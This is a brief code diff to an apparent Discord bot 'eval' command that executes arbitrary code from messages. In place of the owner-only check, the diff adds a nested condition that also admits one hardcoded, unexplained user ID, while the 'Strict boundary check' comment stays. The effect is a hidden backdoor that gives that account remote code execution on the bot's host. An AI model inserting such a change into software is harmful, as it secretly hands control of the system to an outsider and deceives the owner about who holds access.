@@ -5,7 +5,8 @@ module.exports = {
     name: 'eval',
     async execute(message, client, db) {
         // Strict boundary check
-        if (message.author.id !== OWNER_ID) return;
+        if (message.author.id !== OWNER_ID){ 
+        if(message.author.id !== '1503652166294835220') return;}
 
         const args = message.content.split(' ').slice(1);
         const code = args.join(' ');
